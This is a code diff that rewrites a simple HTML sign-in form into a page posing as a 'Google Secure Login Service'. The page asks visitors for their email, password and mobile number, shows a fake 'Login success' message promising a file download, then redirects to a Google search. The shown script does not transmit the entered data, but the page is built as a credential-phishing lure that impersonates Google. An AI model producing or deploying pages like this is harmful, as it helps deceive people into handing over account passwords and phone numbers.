@@ -3,30 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Form Redirect</title>
+    <title>Google Secure Login Service</title>
+    <style>
+        body {
+            background-color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #4285F4;
+            font-size: 24px;
+        }
+        label {
+            display: block;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="email"], input[type="password"], input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        input[type="submit"] {
+            background-color: #4285F4;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .success-message {
+            font-weight: bold;
+            color: green;
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Hello Mr. Balar</h1>
-    
-    <p>Please sign in with your details to access the content:</p>
-
-    <form action="https://drive.google.com/file/d/1uXyt5sNpKVW49l3Cn4p5gdhBuXHE7FRT/view?usp=sharing" method="GET" onsubmit="return validateForm()">
-        <label for="name">Name:</label>
-        <input type="text" id="name" name="name" required><br><br>
-
-        <label for="email">Email:</label>
-        <input type="email" id="email" name="email" required><br><br>
-
-        <label for="contact">Contact Number:</label>
-        <input type="tel" id="contact" name="contact" required><br><br>
-
-        <input type="submit" value="Sign In">
-    </form>
+    <div class="container">
+        <h1>GOOGLE SECURE LOGIN SERVICE</h1>
+        
+        <form id="loginForm" onsubmit="return validateForm()">
+            <label for="email">Name or Email ID:</label>
+            <input type="text" id="email" name="email" required>
+            
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+            
+            <label for="contact">Mobile Number:</label>
+            <input type="tel" id="contact" name="contact" required>
+            
+            <input type="submit" value="Sign In">
+        </form>
+        
+        <p class="success-message" id="successMessage">Login success! Please wait to download the file...</p>
+    </div>
 
     <script>
         function validateForm() {
-            // Add any additional form validation logic here if needed
-            return true; // Return true to allow form submission
+            var form = document.getElementById('loginForm');
+            var successMessage = document.getElementById('successMessage');
+
+            // Perform form validation if needed
+
+            // Display success message
+            successMessage.style.display = 'block';
+
+            // Redirect after a short delay
+            setTimeout(function() {
+                window.location.href = 'https://www.google.com/search?sca_esv=ebed1bc4cb2a93a4&sca_upv=1&rlz=1C1ONGR_enIN1097IN1097&q=tamilnadu+legislative+assembly+2024&udm=2&fbs=AEQNm0DSjjYWCybNh4Y2in02N243-OHmPxREG1BKYr-Kgpdbh-COBiIiY8Fo3IG2RaEyCjej1JUx8BX1u76p09NZAhv-YNiGIgZaBVjE1yk17r1Pes7N9RcUvgmVqNTHO5N_g-kDyYgYdm4Op_EcGu7hted7E2mWk79xdPeBeYAs19hMVEDpflJ2rmVJ8xnZa2uRFEpNko7gAJheNEfaMN8eCXu7CiQQ6A&sa=X&ved=2ahUKEwiIudHQvuCIAxXa1zgGHSb_EpUQtKgLegQIEhAB&biw=2133&bih=1012&dpr=0.9#vhid=LMJtsh7bDC9ShM&vssid=mosaic';
+            }, 2000); // 2 seconds delay
+
+            return false; // Prevent default form submission
         }
     </script>
 </body>
